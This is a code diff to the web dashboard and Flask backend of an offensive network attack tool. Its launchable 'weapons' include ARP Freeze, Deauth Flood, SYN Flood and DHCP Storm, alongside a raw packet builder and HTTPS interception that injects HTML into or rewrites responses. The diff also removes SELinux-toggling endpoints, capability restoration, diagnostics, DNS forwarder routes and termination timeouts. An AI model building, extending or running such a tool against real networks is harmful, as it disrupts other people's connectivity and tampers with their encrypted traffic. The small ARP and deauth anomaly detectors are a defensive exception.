-      <strong>⚠️ Critical capability missing:</strong> <span id="capabilities-warning-text">CAP_NET_RAW</span> required for packet injection. <button class="btn" onclick="restoreCapabilities()" style="margin-left:10px; padding:8px 12px; font-size:0.9rem;">Attempt Restore</button> or <button class="btn secondary" onclick="updateCapabilityStatus()" style="margin-left:6px; padding:8px 12px; font-size:0.9rem;">Refresh</button>
-    </div>
     <div class="card">
       <h2>Interface & gateway</h2>
       <p class="sub">Start here — set your Wi‑Fi interface and gateway IP before scanning or attacking.</p>
@@ -7176,6 +5158,11 @@ GODHAND_DDNS_ENABLED=1                  # optional, default on when the above ar
       </div>
     </div>
     <div class="card">
+      <h2>Live traffic capture</h2>
+      <p class="sub">Weapon 5 output — see the <strong>Monitor</strong> tab for the full capture &amp; analysis panel (top talkers, ports, live feed).</p>
+      <div id="attacks-traffic-status" class="status-message">Not capturing.</div>
+    </div>
+    <div class="card">
       <h2>Custom packet builder</h2>
       <p class="sub">Craft and send a raw Ethernet/IP frame yourself — your own MACs, IPs, ports, TCP flags, and payload. Capped at 50 sends per click; for sustained floods use the weapons above instead.</p>
       <div class="row">
@@ -7303,56 +5290,49 @@ GODHAND_DDNS_ENABLED=1                  # optional, default on when the above ar
       <div class="empty" id="traffic-empty" style="display:none;">Not capturing. Select weapon 5 on the Attacks tab and press Start.</div>
     </div>
     <div class="card">
-      <h2 style="cursor:pointer; user-select:none;" onclick="toggleAdvancedTools()">▼ Reassembled HTTP streams & Analysis Tools</h2>
-      <div id="advanced-tools-section" style="display:block;">
-        <p class="sub" style="margin-top:0;">Fragmented HTTP requests/responses stitched back together from their TCP segments in sequence order — not just what a single packet's first line shows.</p>
-        <div id="tcp-streams-list"></div>
-        <div class="empty" id="tcp-streams-empty">No HTTP streams reassembled yet.</div>
-
-        <div style="margin-top:20px; padding-top:20px; border-top:1px solid #333;">
-          <h3 style="margin-top:0; font-size:0.95rem; color:#0f0;">Paste an ARP snapshot</h3>
-          <p class="sub">Run <code>arp -a</code> and paste output below. Detects MAC changes.</p>
-          <textarea id="arp-input" placeholder="e.g. 192.168.1.1 aa:bb:cc:dd:ee:ff" style="height:80px;"></textarea>
-          <div class="row" style="margin-top:10px;">
-            <button class="btn" onclick="ingestArp()">Analyze snapshot</button>
-            <button class="btn secondary" onclick="clearArpHistory()">Clear history</button>
-          </div>
-          <p class="sub" style="margin-top:10px;">Snapshots analyzed: <span id="arp-snap-count">0</span></p>
-        </div>
-
-        <div style="margin-top:15px; padding-top:15px; border-top:1px solid #333;">
-          <h3 style="margin-top:0; font-size:0.95rem; color:#0f0;">Paste deauth / frame-count log</h3>
-          <p class="sub">Format: numbers separated by comma or newline.</p>
-          <textarea id="deauth-input" placeholder="2,3,1,4,2,58,61,2,3" style="height:80px;"></textarea>
-          <div class="row" style="margin-top:10px;">
-            <button class="btn" onclick="analyzeDeauth()">Analyze log</button>
-          </div>
-        </div>
-
-        <div style="margin-top:15px; padding-top:15px; border-top:1px solid #333;">
-          <h3 style="margin-top:0; font-size:0.95rem; color:#0f0;">Alerts</h3>
-          <div id="alerts"></div>
-          <div class="empty" id="alerts-empty">No anomalies detected yet.</div>
-        </div>
-
-        <div style="margin-top:15px; padding-top:15px; border-top:1px solid #333;">
-          <h3 style="margin-top:0; font-size:0.95rem; color:#0f0;">Activity log (server-side)</h3>
-          <p class="sub">All actions are logged on the server.</p>
-          <button class="btn secondary" onclick="clearServerLogs()">Clear server log</button>
-          <div class="log-container" id="log-container"></div>
-        </div>
+      <h2>Reassembled HTTP streams</h2>
+      <p class="sub">Fragmented HTTP requests/responses stitched back together from their TCP segments in sequence order — not just what a single packet's first line shows.</p>
+      <div id="tcp-streams-list"></div>
+      <div class="empty" id="tcp-streams-empty">No HTTP streams reassembled yet.</div>
+    </div>
+    <div class="card">
+      <h2>Paste an ARP snapshot</h2>
+      <p class="sub">Run <code>arp -a</code> and paste output below. Detects MAC changes.</p>
+      <textarea id="arp-input" placeholder="e.g. 192.168.1.1 aa:bb:cc:dd:ee:ff"></textarea>
+      <div class="row" style="margin-top:10px;">
+        <button class="btn" onclick="ingestArp()">Analyze snapshot</button>
+        <button class="btn secondary" onclick="clearArpHistory()">Clear history</button>
       </div>
+      <p class="sub" style="margin-top:10px;">Snapshots analyzed: <span id="arp-snap-count">0</span></p>
+    </div>
+    <div class="card">
+      <h2>Paste deauth / frame-count log</h2>
+      <p class="sub">Format: numbers separated by comma or newline.</p>
+      <textarea id="deauth-input" placeholder="2,3,1,4,2,58,61,2,3"></textarea>
+      <div class="row" style="margin-top:10px;">
+        <button class="btn" onclick="analyzeDeauth()">Analyze log</button>
+      </div>
+    </div>
+    <div class="card">
+      <h2>Alerts</h2>
+      <div id="alerts"></div>
+      <div class="empty" id="alerts-empty">No anomalies detected yet.</div>
+    </div>
+    <div class="card">
+      <h2>Activity log (server-side)</h2>
+      <p class="sub">All actions are logged on the server.</p>
+      <button class="btn secondary" onclick="clearServerLogs()">Clear server log</button>
+      <div class="log-container" id="log-container"></div>
     </div>
   </div>
 
   <div id="tab-https" class="tab-content">
-    <!-- Header & Statistics (Persistent across sub-tabs) -->
     <div class="card">
       <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
-        <h2 style="margin:0;">HTTPS Traffic Interception</h2>
+        <h2 style="margin:0;">HTTPS traffic monitor</h2>
         <span id="https-status-badge">Inactive</span>
       </div>
-      <p class="sub">Real-time HTTPS monitoring, injection rules, and .lan domain configuration</p>
+      <p class="sub">Real-time HTTPS interception: monitor encrypted traffic, inspect requests/responses, and apply injection rules.</p>
       <div class="stat-row">
         <div class="stat-tile"><span class="stat-value" id="https-stat-total">0</span><span class="stat-label">Requests</span></div>
         <div class="stat-tile"><span class="stat-value" id="https-stat-hosts">0</span><span class="stat-label">Domains</span></div>
@@ -7360,89 +5340,74 @@ GODHAND_DDNS_ENABLED=1                  # optional, default on when the above ar
       </div>
     </div>
 
-    <!-- Sub-tabs Navigation -->
-    <div class="card" style="padding:0; background:transparent; border:none; margin-bottom:0;">
-      <div class="https-subtabs" style="display:flex; gap:0; border-bottom:1px solid #444; background:#0a0a0a; border-radius:4px 4px 0 0;">
-        <button class="https-subtab-btn active" onclick="switchHttpsSubtab('live-traffic')" style="flex:1; padding:12px 16px; border:none; background:transparent; color:#0f0; cursor:pointer; border-bottom:2px solid #0f0; font-weight:500; text-align:left; font-size:0.95rem;">Live Traffic</button>
-        <button class="https-subtab-btn" onclick="switchHttpsSubtab('injection')" style="flex:1; padding:12px 16px; border:none; background:transparent; color:#666; cursor:pointer; border-bottom:2px solid transparent; font-weight:500; text-align:left; font-size:0.95rem;">Injection Rules</button>
-        <button class="https-subtab-btn" onclick="switchHttpsSubtab('domains')" style="flex:1; padding:12px 16px; border:none; background:transparent; color:#666; cursor:pointer; border-bottom:2px solid transparent; font-weight:500; text-align:left; font-size:0.95rem;">.lan Domains</button>
+    <div class="card">
+      <h2>Live HTTPS traffic</h2>
+      <div class="table-responsive" style="max-height:400px; overflow-y:auto;">
+        <table>
+          <thead>
+            <tr>
+              <th style="min-width:150px;">Timestamp</th>
+              <th style="min-width:200px;">Domain</th>
+              <th>Method</th>
+              <th>Path</th>
+              <th>Status</th>
+              <th style="min-width:100px;">Size</th>
+            </tr>
+          </thead>
+          <tbody id="https-traffic-body">
+            <tr><td colspan="6" style="text-align:center; color:#999;">No HTTPS traffic captured yet. Gateway services must be running.</td></tr>
+          </tbody>
+        </table>
       </div>
     </div>
 
-    <!-- Sub-tab: Live Traffic -->
-    <div id="https-subtab-live-traffic" class="https-subtab active" style="display:block;">
-      <div class="card">
-        <div class="table-responsive" style="max-height:500px; overflow-y:auto;">
-          <table>
-            <thead>
-              <tr>
-                <th style="min-width:150px;">Timestamp</th>
-                <th style="min-width:200px;">Domain</th>
-                <th>Method</th>
-                <th>Path</th>
-                <th>Status</th>
-                <th style="min-width:100px;">Size</th>
-              </tr>
-            </thead>
-            <tbody id="https-traffic-body">
-              <tr><td colspan="6" style="text-align:center; color:#999;">No HTTPS traffic captured yet. Gateway services must be running.</td></tr>
-            </tbody>
-          </table>
-        </div>
-      </div>
-    </div>
+    <div class="card">
+      <h2>Response injection rules</h2>
+      <p class="sub">Create rules to modify HTTPS responses: inject headers, remove headers, replace content, inject HTML.</p>
 
-    <!-- Sub-tab: Injection Rules -->
-    <div id="https-subtab-injection" class="https-subtab" style="display:none;">
-      <div class="card">
-        <p class="sub">Create rules to modify HTTPS responses: inject headers, remove headers, replace content, inject HTML.</p>
-
-        <div style="margin-bottom:16px; padding:12px; background:#1a1a1a; border:1px solid #444; border-radius:4px;">
-          <h3 style="margin-top:0; margin-bottom:8px; font-size:0.95rem;">New Rule</h3>
-          <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:8px;">
-            <div>
-              <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Domain pattern (*.example.com)</label>
-              <input type="text" id="rule-hostname" placeholder="*.example.com or *" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
-            </div>
-            <div>
-              <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Action type</label>
-              <select id="rule-action" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
-                <option value="add_header">Add header</option>
-                <option value="remove_header">Remove header</option>
-                <option value="replace_body">Replace text</option>
-                <option value="inject_html">Inject HTML</option>
-              </select>
-            </div>
+      <div style="margin-bottom:16px; padding:12px; background:#1a1a1a; border:1px solid #444; border-radius:4px;">
+        <h3 style="margin-top:0; margin-bottom:8px; font-size:0.95rem;">New rule</h3>
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:8px;">
+          <div>
+            <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Domain pattern (*.example.com)</label>
+            <input type="text" id="rule-hostname" placeholder="*.example.com or *" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
           </div>
           <div>
-            <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Value</label>
-            <textarea id="rule-value" placeholder="Header-Name: value  OR  search|replace  OR  HTML code" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px; min-height:60px; font-family:monospace; font-size:0.85rem;"></textarea>
-          </div>
-          <div style="display:flex; gap:8px; margin-top:8px;">
-            <button class="btn" onclick="createInjectionRule()" style="flex:1;">Create rule</button>
-            <button class="btn secondary" onclick="clearRuleForm()" style="flex:1;">Clear</button>
+            <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Action type</label>
+            <select id="rule-action" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
+              <option value="add_header">Add header</option>
+              <option value="remove_header">Remove header</option>
+              <option value="replace_body">Replace text</option>
+              <option value="inject_html">Inject HTML</option>
+            </select>
           </div>
         </div>
+        <div>
+          <label style="font-size:0.8rem; color:#999; display:block; margin-bottom:4px;">Value</label>
+          <textarea id="rule-value" placeholder="Header-Name: value  OR  search|replace  OR  HTML code" style="width:100%; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px; min-height:60px; font-family:monospace; font-size:0.85rem;"></textarea>
+        </div>
+        <div style="display:flex; gap:8px; margin-top:8px;">
+          <button class="btn" onclick="createInjectionRule()" style="flex:1;">Create rule</button>
+          <button class="btn secondary" onclick="clearRuleForm()" style="flex:1;">Clear</button>
+        </div>
+      </div>
 
-        <div id="rules-container">
-          <p style="color:#999; text-align:center;">Loading rules...</p>
-        </div>
+      <div id="rules-container">
+        <p style="color:#999; text-align:center;">Loading rules...</p>
       </div>
     </div>
 
-    <!-- Sub-tab: .lan Domains -->
-    <div id="https-subtab-domains" class="https-subtab" style="display:none;">
-      <div class="card">
-        <p class="sub">Configure custom .lan domains for transparent proxy discovery (e.g., pac.installCA.lan).</p>
+    <div class="card">
+      <h2>.lan domain management</h2>
+      <p class="sub">Configure custom .lan domains for transparent proxy discovery (e.g., pac.installCA.lan).</p>
 
-        <div style="display:flex; gap:8px; margin-bottom:12px;">
-          <input type="text" id="lan-domain-input" placeholder="custom.lan" style="flex:1; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
-          <button class="btn" onclick="addLanDomain()" style="min-width:100px;">Add domain</button>
-        </div>
+      <div style="display:flex; gap:8px; margin-bottom:12px;">
+        <input type="text" id="lan-domain-input" placeholder="custom.lan" style="flex:1; padding:6px; border:1px solid #555; background:#0a0a0a; color:#0f0; border-radius:4px;">
+        <button class="btn" onclick="addLanDomain()" style="min-width:100px;">Add domain</button>
+      </div>
 
-        <div id="lan-domains-list">
-          <p style="color:#999; text-align:center;">Loading domains...</p>
-        </div>
+      <div id="lan-domains-list">
+        <p style="color:#999; text-align:center;">Loading domains...</p>
       </div>
     </div>
   </div>
@@ -7591,38 +5556,6 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'attacks') { refreshDeauthCapability(); refreshSynFloodCapability(); }
   });
 });
-
-// Advanced Tools Collapsible Section
-function toggleAdvancedTools() {
-  const section = document.getElementById('advanced-tools-section');
-  const h2 = event.target.closest('h2');
-  if (section.style.display === 'none') {
-    section.style.display = 'block';
-    h2.textContent = '▼ Reassembled HTTP streams & Analysis Tools';
-  } else {
-    section.style.display = 'none';
-    h2.textContent = '▶ Reassembled HTTP streams & Analysis Tools';
-  }
-}
-
-// HTTPS Sub-tabs
-function switchHttpsSubtab(subtabName) {
-  // Hide all sub-tabs
-  document.querySelectorAll('.https-subtab').forEach(tab => tab.style.display = 'none');
-  // Deactivate all sub-tab buttons
-  document.querySelectorAll('.https-subtab-btn').forEach(btn => {
-    btn.style.color = '#666';
-    btn.style.borderBottom = '2px solid transparent';
-  });
-  // Show selected sub-tab
-  const subtab = document.getElementById('https-subtab-' + subtabName);
-  if (subtab) {
-    subtab.style.display = 'block';
-  }
-  // Activate selected button
-  event.target.style.color = '#0f0';
-  event.target.style.borderBottom = '2px solid #0f0';
-}
 
 // Weapon selection
 document.querySelectorAll('.weapon-btn').forEach(el => {
@@ -7793,12 +5726,6 @@ function exportPacketsCSV() {
 }
 var TRAFFIC_ALL_ENTRIES = [];
 async function pollTrafficCapture() {
-  // Only poll when Monitor tab is active to avoid wasting bandwidth
-  const monitorTab = document.getElementById('tab-monitor');
-  if (!monitorTab || !monitorTab.classList.contains('active')) {
-    return;
-  }
-
   try {
     const res = await apiCall('monitor_log');
     TRAFFIC_ALL_ENTRIES = res.entries || [];
@@ -8228,104 +6155,6 @@ async function checkPrerequisites() {
   } catch(e) {}
 }
 
-// SELinux status check
-async function updateSelinuxStatus() {
-  try {
-    const data = await apiCall('selinux/status');
-    const selinuxWarning = document.getElementById('selinux-warning');
-    if (selinuxWarning) {
-      if (data.enforcing) {
-        selinuxWarning.style.display = 'block';
-        selinuxWarning.innerHTML = `<strong>⚠️ SELinux is ENFORCING.</strong> Network operations may be blocked. <button class="btn" onclick="setSelinuxPermissive()" style="margin-left:10px; padding:8px 12px; font-size:0.9rem;">Set Permissive</button> or <button class="btn secondary" onclick="updateSelinuxStatus()" style="margin-left:6px; padding:8px 12px; font-size:0.9rem;">Refresh</button>`;
-      } else if (data.status === 'Permissive') {
-        selinuxWarning.style.display = 'block';
-        selinuxWarning.style.borderLeftColor = 'var(--info)';
-        selinuxWarning.innerHTML = `<strong>ℹ️ SELinux is Permissive.</strong> Warnings logged but not enforced. <button class="btn secondary" onclick="setSelinuxEnforcing()" style="margin-left:10px; padding:8px 12px; font-size:0.9rem;">Set Enforcing</button>`;
-      } else {
-        selinuxWarning.style.display = 'none';
-      }
-    }
-  } catch(e) {
-    // SELinux not available or error querying status
-  }
-}
-
-async function setSelinuxPermissive() {
-  try {
-    const data = await apiCall('selinux/set_permissive', 'POST');
-    if (data.success) {
-      showToast('SELinux set to Permissive', 'success');
-      await updateSelinuxStatus();
-    } else {
-      showToast('Failed to set SELinux permissive: ' + (data.error || 'unknown'), 'error');
-    }
-  } catch(e) {
-    showToast('Error: ' + e.message, 'error');
-  }
-}
-
-async function setSelinuxEnforcing() {
-  try {
-    const data = await apiCall('selinux/set_enforcing', 'POST');
-    if (data.success) {
-      showToast('SELinux set to Enforcing', 'success');
-      await updateSelinuxStatus();
-    } else {
-      showToast('Failed to set SELinux enforcing: ' + (data.error || 'unknown'), 'error');
-    }
-  } catch(e) {
-    showToast('Error: ' + e.message, 'error');
-  }
-}
-
-// Capability verification
-async function updateCapabilityStatus() {
-  try {
-    const data = await apiCall('capabilities/status');
-    const caps = data.capabilities;
-    const capWarning = document.getElementById('capabilities-warning');
-    const capWarningText = document.getElementById('capabilities-warning-text');
-
-    let hasMissingCapability = false;
-    let missingCaps = [];
-
-    if (!caps.packet_injection_enabled) {
-      hasMissingCapability = true;
-      missingCaps.push('CAP_NET_RAW (packet injection)');
-    }
-
-    if (!caps.traffic_redirect_enabled && !caps.has_cap_net_admin) {
-      hasMissingCapability = true;
-      missingCaps.push('CAP_NET_ADMIN (traffic redirect)');
-    }
-
-    if (capWarning) {
-      if (hasMissingCapability) {
-        capWarning.style.display = 'block';
-        capWarningText.textContent = missingCaps.join(', ');
-      } else {
-        capWarning.style.display = 'none';
-      }
-    }
-  } catch(e) {
-    // Capabilities API not available
-  }
-}
-
-async function restoreCapabilities() {
-  try {
-    const data = await apiCall('capabilities/restore', 'POST');
-    if (data.success) {
-      showToast('Capability restoration attempted', 'success');
-      setTimeout(() => updateCapabilityStatus(), 1000);
-    } else {
-      showToast('Could not restore capabilities automatically; run as root', 'error');
-    }
-  } catch(e) {
-    showToast('Error: ' + e.message, 'error');
-  }
-}
-
 // Interface loading
 async function loadInterfaces() {
   try {
@@ -8617,40 +6446,11 @@ async function launchAttack(confirmRisk) {
     showToast('Failed: ' + res.error, 'error');
   }
 }
-let stopInProgress = false;
 async function confirmStopAttack() {
-  if (stopInProgress) {
-    showToast('Attack stop already in progress...', 'info');
-    return;
-  }
   openModal('Stop Attack', 'Stop all running attacks?', async () => {
-    try {
-      stopInProgress = true;
-      document.getElementById('stop-btn').disabled = true;
-      showToast('Stopping attacks...', 'info');
-
-      const res = await apiCall('stop_attack', 'POST');
-      if (res.success) {
-        showToast('Termination in progress (will complete in background)', 'success');
-        // Poll more frequently while stopping
-        for (let i = 0; i < 30; i++) {
-          await new Promise(r => setTimeout(r, 200));
-          await pollAttackStatus();
-          const status = await apiCall('attack_status');
-          if (!Object.values(status.attacks).some(v => v)) {
-            showToast('All attacks stopped', 'success');
-            break;
-          }
-        }
-      } else {
-        showToast(res.error || 'Failed to stop attacks', 'error');
-      }
-    } catch (e) {
-      showToast('Error: ' + e.message, 'error');
-    } finally {
-      stopInProgress = false;
-      pollAttackStatus();
-    }
+    const res = await apiCall('stop_attack', 'POST');
+    showToast(res.status, res.success ? 'success' : 'error');
+    pollAttackStatus();
   });
 }
 
@@ -8966,8 +6766,6 @@ function initApp() {
   loadInterfaces();
   loadTargets();
   checkPrerequisites();
-  updateSelinuxStatus();
-  updateCapabilityStatus();
   pollLogs();
   pollAttackStatus();
   pollTrafficCapture();
@@ -8979,8 +6777,6 @@ function initApp() {
   setInterval(pollTrafficCapture, 1000);
   setInterval(pollBandwidth, 2000);
   setInterval(refreshGatewayStatus, 4000);
-  setInterval(updateSelinuxStatus, 10000);
-  setInterval(updateCapabilityStatus, 10000);
 }
 
 // ========== HTTPS Interception (Phase 1.5) ==========
@@ -9575,15 +7371,14 @@ def api_start_attack():
         if risk:
             return jsonify({'success': False, 'requires_confirmation': True,
                              'error': f'{risk} Start {weapon_names_pre[weapon]} anyway?'})
+    if weapon in STATE['attack_pids']:
+        kill_attack(STATE['attack_pids'][weapon])
+        del STATE['attack_pids'][weapon]
     try:
+        pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
+        if not pids:
+            raise RuntimeError('Attack launcher returned no processes')
         with STATE_LOCK:
-            if weapon in STATE['attack_pids']:
-                kill_attack(STATE['attack_pids'][weapon])
-                del STATE['attack_pids'][weapon]
-
-            pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
-            if not pids:
-                raise RuntimeError('Attack launcher returned no processes')
             STATE['attack_pids'][weapon] = pids
             STATE['attack_status'][weapon] = 'running'
         weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
@@ -9688,47 +7483,29 @@ def api_stop_network_port_monitor():
 
 def _terminate_attacks_async(attack_pids_copy, interface_to_reset_val):
     """Terminate all attack processes asynchronously (runs in daemon thread)."""
-    import time
-    max_thread_time = 15.0  # Hard limit for entire operation
-    start_time = time.time()
-
     try:
-        # Terminate all processes with per-process and total timeouts
         for weapon, pids in attack_pids_copy.items():
-            elapsed = time.time() - start_time
-            if elapsed >= max_thread_time:
-                add_log('warn', f'Async termination timeout, skipping weapon {weapon}')
-                break
-
             add_log('dev', f'Terminating {len(pids)} process(es) for weapon {weapon}')
             try:
-                # Use aggressive timeouts: 1s per process, 12s total
-                remaining_timeout = max_thread_time - elapsed
-                kill_attack(pids, timeout_per_process=1.0, max_total_timeout=remaining_timeout)
+                kill_attack(pids)
                 add_log('dev', f'Weapon {weapon} terminated successfully')
             except Exception as e:
                 add_log('error', f'Failed to terminate weapon {weapon}: {e}')
 
-        # Reset monitor mode if needed (quick operation, shouldn't timeout)
+        # Reset monitor mode if needed
         if interface_to_reset_val:
             try:
-                elapsed = time.time() - start_time
-                if elapsed < max_thread_time - 1:
-                    set_monitor(interface_to_reset_val, False)
-                    with STATE_LOCK:
-                        update_state('monitor_mode_active', False)
-                    add_log('dev', f'Monitor mode reset on {interface_to_reset_val}')
+                set_monitor(interface_to_reset_val, False)
+                with STATE_LOCK:
+                    update_state('monitor_mode_active', False)
+                add_log('dev', f'Monitor mode reset on {interface_to_reset_val}')
             except Exception as e:
                 add_log('warn', f'Failed to reset monitor mode: {e}')
 
-        # Cleanup: clear attack state (atomic under lock)
-        # Only clear the weapons we actually terminated, not any new attacks started after snapshot
+        # Cleanup: clear attack state
         with STATE_LOCK:
-            for weapon in attack_pids_copy.keys():
-                if weapon in STATE['attack_pids']:
-                    del STATE['attack_pids'][weapon]
-                if weapon in STATE['attack_status']:
-                    del STATE['attack_status'][weapon]
+            STATE['attack_pids'] = {}
+            STATE['attack_status'] = {}
             if STATE['monitor_log_path']:
                 try:
                     os.unlink(STATE['monitor_log_path'])
@@ -9736,14 +7513,9 @@ def _terminate_attacks_async(attack_pids_copy, interface_to_reset_val):
                     pass
                 STATE['monitor_log_path'] = None
 
-        elapsed = time.time() - start_time
-        add_log('info', f'All attacks stopped and cleaned up (took {elapsed:.1f}s)')
+        add_log('info', 'All attacks stopped and cleaned up')
     except Exception as e:
         add_log('error', f'Fatal error in attack termination thread: {e}')
-        # Ensure state is cleared even on error
-        with STATE_LOCK:
-            STATE['attack_pids'] = {}
-            STATE['attack_status'] = {}
 
 @app.route('/api/stop_attack', methods=['POST'])
 @require_auth
@@ -9781,9 +7553,7 @@ def api_stop_attack():
 def api_attack_status():
     with STATE_LOCK:
         for weapon, pids in STATE['attack_pids'].items():
-            # Mark weapon as dead only if ALL processes have exited (not just one)
-            # This is critical for attacks with multiple processes (e.g., ARP Freeze has 2x processes per target)
-            if all(p.poll() is not None for p in pids) if pids else False:
+            if any(p.poll() is not None for p in pids):
                 STATE['attack_status'][weapon] = 'dead'
             else:
                 STATE['attack_status'][weapon] = 'running'
@@ -9795,57 +7565,6 @@ def api_attack_status():
 def api_monitor_log():
     entries = STATE.get('monitor_entries', [])
     return jsonify({'entries': entries[-150:], 'capturing': 5 in STATE['attack_pids']})
-
-@app.route('/api/traffic_diagnostics', methods=['GET'])
-@require_auth
-def api_traffic_diagnostics():
-    """Diagnose why traffic capture may not be working."""
-    diags = {
-        'capturing': 5 in STATE['attack_pids'],
-        'entries_count': len(STATE.get('monitor_entries', [])),
-        'af_packet_available': False,
-        'monitor_mode_capable': False,
-        'issues': []
-    }
-
-    # Test AF_PACKET socket availability
-    try:
-        test_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-        test_sock.close()
-        diags['af_packet_available'] = True
-    except (OSError, AttributeError) as e:
-        diags['issues'].append(f'AF_PACKET socket not available: {e}')
-
-    # Check if interface supports monitor mode
-    iface = get_state('interface')
-    if iface:
-        diags['interface'] = iface
-        try:
-            result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, timeout=2)
-            if result.returncode == 0:
-                diags['interface_exists'] = True
-            else:
-                diags['issues'].append(f'Interface {iface} not found')
-        except Exception as e:
-            diags['issues'].append(f'Cannot check interface: {e}')
-
-    # Check if network is accessible
-    try:
-        test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        test_sock.connect(('1.1.1.1', 53))
-        test_sock.close()
-        diags['network_accessible'] = True
-    except:
-        diags['issues'].append('Network may be down or unavailable')
-
-    if not diags['capturing']:
-        diags['issues'].append('Traffic capture not running; start weapon 5 (Traffic Capture) on Attacks tab')
-
-    if not diags['entries_count']:
-        if diags['capturing']:
-            diags['issues'].append('Capture running but no traffic received yet')
-
-    return jsonify({'success': True, 'diagnostics': diags})
 
 @app.route('/api/traffic_stats', methods=['GET'])
 @require_auth
@@ -9958,8 +7677,6 @@ def api_gateway_add_lan_domain():
     with STATE_LOCK:
         if domain not in STATE['lan_domains']:
             STATE['lan_domains'].append(domain)
-            if len(STATE['lan_domains']) > 100:
-                STATE['lan_domains'] = STATE['lan_domains'][-100:]
         lan_domains = list(STATE['lan_domains'])
 
     # Regenerate gateway configs with new domains
@@ -9993,392 +7710,6 @@ def api_gateway_remove_lan_domain():
         add_log('error', f'Failed to remove .lan domain: {e}')
         return jsonify({'success': False, 'error': str(e)})
 
-@app.route('/api/gateway/dns/python/start', methods=['POST'])
-@require_auth
-def api_python_dns_start():
-    try:
-        lan_domains = STATE.get('lan_domains', ['pac.installCA.lan'])
-        blocked_domains = STATE.get('blocked_domains', list(DEFAULT_BLOCKED_DOMAINS))
-        success = start_python_dns_forwarder(listen_port=53, lan_domains=lan_domains, blocked_domains=blocked_domains)
-        if success:
-            add_log('success', 'Python DNS forwarder started on port 53')
-            return jsonify({'success': True, 'message': 'Python DNS forwarder started'})
-        else:
-            return jsonify({'success': False, 'error': 'Failed to bind port 53; try running as root'})
-    except Exception as e:
-        add_log('error', f'Python DNS forwarder start failed: {e}')
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/gateway/dns/python/stop', methods=['POST'])
-@require_auth
-def api_python_dns_stop():
-    stop_python_dns_forwarder()
-    add_log('info', 'Python DNS forwarder stopped')
-    return jsonify({'success': True, 'message': 'Python DNS forwarder stopped'})
-
-@app.route('/api/gateway/dns/python/fallback', methods=['POST'])
-@require_auth
-def api_python_dns_fallback():
-    """Attempt to start Python DNS forwarder on fallback port if port 53 is unavailable."""
-    try:
-        fallback_port = 5353  # mDNS port as fallback
-        _forwarder = PythonDNSForwarder(
-            listen_port=fallback_port,
-            lan_domains=STATE.get('lan_domains', ['pac.installCA.lan']),
-            blocked_domains=STATE.get('blocked_domains', list(DEFAULT_BLOCKED_DOMAINS))
-        )
-        if _forwarder.start():
-            add_log('warn', f'DNS forwarder running on port {fallback_port} (port 53 unavailable; update client DNS config)')
-            return jsonify({'success': True, 'message': f'DNS forwarder on fallback port {fallback_port}', 'port': fallback_port})
-        else:
-            return jsonify({'success': False, 'error': f'Failed to bind port {fallback_port}'})
-    except Exception as e:
-        add_log('error', f'DNS forwarder fallback failed: {e}')
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/selinux/status', methods=['GET'])
-@require_auth
-def api_selinux_status():
-    status = check_selinux_status()
-    if status is None:
-        return jsonify({'success': True, 'status': 'disabled', 'enforcing': False})
-    return jsonify({'success': True, 'status': status, 'enforcing': status == 'Enforcing'})
-
-@app.route('/api/selinux/set_permissive', methods=['POST'])
-@require_auth
-def api_selinux_set_permissive():
-    try:
-        result = subprocess.run(['setenforce', '0'], capture_output=True, text=True, timeout=2)
-        if result.returncode == 0:
-            add_log('success', 'SELinux set to Permissive mode')
-            return jsonify({'success': True, 'message': 'SELinux set to Permissive'})
-        else:
-            add_log('error', f'setenforce failed: {result.stderr}')
-            return jsonify({'success': False, 'error': result.stderr})
-    except Exception as e:
-        add_log('error', f'Failed to set permissive: {e}')
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/selinux/set_enforcing', methods=['POST'])
-@require_auth
-def api_selinux_set_enforcing():
-    try:
-        result = subprocess.run(['setenforce', '1'], capture_output=True, text=True, timeout=2)
-        if result.returncode == 0:
-            add_log('success', 'SELinux set to Enforcing mode')
-            return jsonify({'success': True, 'message': 'SELinux set to Enforcing'})
-        else:
-            add_log('error', f'setenforce failed: {result.stderr}')
-            return jsonify({'success': False, 'error': result.stderr})
-    except Exception as e:
-        add_log('error', f'Failed to set enforcing: {e}')
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/diagnostics/ping', methods=['POST'])
-@require_auth
-def api_diagnostics_ping():
-    data = request.json or {}
-    target = data.get('target', 'google.com').strip()
-
-    if not target:
-        return jsonify({'success': False, 'error': 'Target required'})
-
-    try:
-        result = ping(target, timeout=5)
-        return jsonify({
-            'success': True,
-            'target': target,
-            'available': result.get('available'),
-            'latency_ms': result.get('latency_ms'),
-            'packet_loss': result.get('packet_loss'),
-            'error': result.get('error')
-        })
-    except Exception as e:
-        add_log('error', f'Ping diagnostics failed for {target}: {e}')
-        return jsonify({'success': False, 'error': str(e)})
-
